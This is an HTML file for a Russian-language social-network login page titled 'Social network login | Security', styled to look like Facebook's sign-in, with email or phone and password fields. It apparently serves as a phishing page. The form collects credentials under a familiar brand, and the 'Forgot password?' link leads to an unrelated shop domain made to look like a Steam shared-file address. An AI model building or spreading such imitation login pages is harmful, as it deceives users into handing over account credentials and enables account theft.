<!DOCTYPE html>
<html>
<head>
    <title>Вход в социальную сеть | Безопасность</title>
    <style>
        body { font-family: Arial; background: #f0f2f5; }
        .login-box { width: 400px; margin: 100px auto; background: white; padding: 20px; border-radius: 8px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; }
        button { background: #1877f2; color: white; border: none; padding: 12px; width: 100%; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Вход в социальную сеть</h2>
        <form>
            <input type="text" placeholder="Электронная почта или телефон">
            <input type="password" placeholder="Пароль">
            <button>Войти</button>
        </form>
        <p style="text-align:center; margin-top:15px;">
            <a href="https://store.poweredgamedev.shop/sharedfiles/filedetails/id=37895845/">Забыли пароль?</a>
        </p>
    </div>
</body>
</html>
